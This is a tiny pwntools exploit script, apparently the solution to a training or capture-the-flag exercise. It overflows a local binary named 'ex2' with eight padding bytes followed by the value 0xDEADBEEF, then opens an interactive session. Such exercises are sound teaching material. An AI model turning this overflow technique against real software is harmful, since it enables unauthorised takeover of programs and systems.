from pwn import *

target = process("./bin/ex2")

payload = b"aaaaaaaa" + p32(0xDEADBEEF)

target.send(payload)

target.interactive()
